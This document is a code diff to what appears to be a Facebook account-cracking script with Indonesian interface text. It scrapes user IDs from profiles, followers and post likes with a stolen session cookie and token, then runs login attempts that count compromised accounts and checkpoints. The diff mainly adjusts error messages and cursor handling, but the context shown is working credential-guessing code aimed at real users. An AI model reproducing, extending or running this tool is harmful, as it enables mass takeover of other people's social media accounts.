@@ -101,7 +101,7 @@ def daftar_menu():
             for z in userid.split(','):
                 dump().publik(int(z), cookie, unit_cursor = '')
             if len(Dump) < 50:
-                Console().print("[bold hot_pink2]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit()
+                Console().print("[bold hot_pink2]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit("\r                                                                         ")
             else:
                 Console(width=50, style="bold hot_pink2").print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Dump Sukses) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
         except Exception as e:
@@ -113,7 +113,7 @@ def daftar_menu():
             for z in userid.split(','):
                 dump().pengikut(z, cookie, token_eaag)
             if len(Dump) < 50:
-                Console().print("[bold hot_pink2]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit()
+                Console().print("[bold hot_pink2]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit("\r                                                                         ")
             else:
                 Console(width=50, style="bold hot_pink2").print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Dump Sukses) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
         except Exception as e:
@@ -125,7 +125,7 @@ def daftar_menu():
             for z in postid.split(','):
                 dump().likes(z, cookie, token_eaag, after = '')
             if len(Dump) < 1:
-                Console().print("[bold hot_pink2]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit()
+                Console().print("[bold hot_pink2]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit("\r                                                                         ")
             else:
                 Console(width=50, style="bold hot_pink2").print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Dump Sukses) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
         except Exception as e:
@@ -168,10 +168,15 @@ class dump:
                             Console().print(f"[bold hot_pink2]   ╰─>[bold green] Dump {self.id_friends}/{len(Dump)} User         ", end='\r');time.sleep(0.0007)
                             Dump.append(f'{self.id_friends}|{self.name}')
                 if 'Sorry, something went wrong.' in str(response):
+                    Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] Sorry, Something Went Wrong!          ", end='\r');time.sleep(2.1)
                     return 0
                 elif 'unit_cursor=' in str(response):
-                    self.unit_cursor = re.search('unit_cursor=(.*?)&', str(response)).group(1)
-                    self.publik(userid, cookie, self.unit_cursor)
+                    try:
+                        self.unit_cursor = re.search('unit_cursor=(.*?)&', str(response)).group(1)
+                        self.publik(userid, cookie, self.unit_cursor)
+                    except (AttributeError):
+                        Console().print(f"[bold hot_pink2]   ╰─>[bold red] Cursor Not Found!            ", end='\r');time.sleep(2.1)
+                        return 2
                 else:
                     return 0
         except (KeyboardInterrupt):
@@ -308,7 +313,7 @@ class crack:
                         self.__a = re.search('"encrypted":"(.*?)"', str(response)).group(1)
                         self.__spin_t = re.search('"__spin_t":(\d+),', str(response)).group(1)
                     except (AttributeError) as e:
-                        Console().print("[bold hot_pink2]   ╰─>[bold red] Terjadi Kesalahan!                    ", end='\r');time.sleep(2.0);continue
+                        Console().print("[bold hot_pink2]   ╰─>[bold red] Failed Scraping...                    ", end='\r');time.sleep(2.0);continue
                     data = {
                         'm_ts': self.m_ts,
                         'li': self.li,
@@ -371,8 +376,6 @@ class crack:
             Console().print(f"[bold hot_pink2]   ╰─>[bold white] Crack {str(len(Dump))}/{self.looping} Ok:-[bold green]{len(self.success)}[bold white] Cp:-[bold red]{len(self.checkpoint)}[bold white]              ", end='\r')
         except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
             Console().print("[bold hot_pink2]   ╰─>[bold red] Koneksi Error!                    ", end='\r');time.sleep(7.9);self.main(total, email, password)
-        except Exception as e:
-            Console().print(f"[bold hot_pink2]   ╰─>[bold red] {str(e).title()}!                    ")
     ### REALME USERAGENT ###
     def realme_useragent(self, total):
         for _ in range(total):
